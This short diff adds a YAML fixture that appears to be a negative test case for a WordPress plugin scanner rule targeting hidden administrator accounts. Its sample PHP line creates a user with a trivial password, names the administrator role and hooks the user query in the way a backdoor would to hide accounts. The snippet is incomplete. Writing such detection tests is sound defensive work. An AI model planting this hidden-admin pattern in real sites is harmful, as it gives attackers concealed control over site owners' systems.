@@ -1,0 +1,11 @@
+eco: wp-plugin
+note: 'rule mu-hidden-admin (Tuner negative 2): not a must-use plugin'
+new:
+  members/hide.php: <?php wp_create_user('x','y'); $r = 'administrator'; add_action('pre_user_query', 'f');
+meta_old:
+  ref:
+    version: 1.0.0
+features_old: []
+features_new: []
+forbid:
+- admin-user-hidden
